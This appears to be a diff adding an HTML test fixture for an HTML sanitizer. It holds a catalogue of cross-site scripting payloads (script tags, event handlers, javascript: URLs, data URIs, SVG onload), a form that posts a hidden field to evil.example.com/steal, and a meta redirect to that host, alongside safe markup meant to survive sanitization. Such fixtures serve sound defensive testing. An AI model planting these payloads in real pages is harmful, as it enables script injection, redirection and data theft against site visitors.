@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS Test Document</title></head>
+<body>
+<h1>Security Test Document</h1>
+<p>This document contains intentional XSS payloads for testing sanitization.</p>
+
+<!-- Script injection -->
+<script>alert('XSS via script tag')</script>
+
+<!-- Event handler injection -->
+<p onmouseover="alert('XSS via onmouseover')">Hover over this paragraph.</p>
+<img src="x" onerror="alert('XSS via onerror')">
+<div onload="alert('XSS via onload')">Content</div>
+
+<!-- URL-based injection -->
+<a href="javascript:alert('XSS via href')">Click me</a>
+<iframe src="javascript:alert('XSS via iframe src')"></iframe>
+
+<!-- Style injection -->
+<div style="background-image: url(javascript:alert('XSS via style'))">Styled div</div>
+
+<!-- Data URI -->
+<object data="data:text/html,<script>alert('XSS via object')</script>">Object</object>
+
+<!-- SVG injection -->
+<svg onload="alert('XSS via SVG')"><circle r="50"></circle></svg>
+
+<!-- Form action injection -->
+<form action="https://evil.example.com/steal">
+  <input type="hidden" name="data" value="stolen">
+  <button>Submit</button>
+</form>
+
+<!-- Meta redirect -->
+<meta http-equiv="refresh" content="0;url=https://evil.example.com">
+
+<h2>Safe Content</h2>
+<p>This paragraph is safe and should be preserved after sanitization. It contains <strong>bold</strong> and <em>italic</em> text that should survive.</p>
+<ul>
+  <li>List item one</li>
+  <li>List item two</li>
+  <li>List item three</li>
+</ul>
+</body>
+</html>
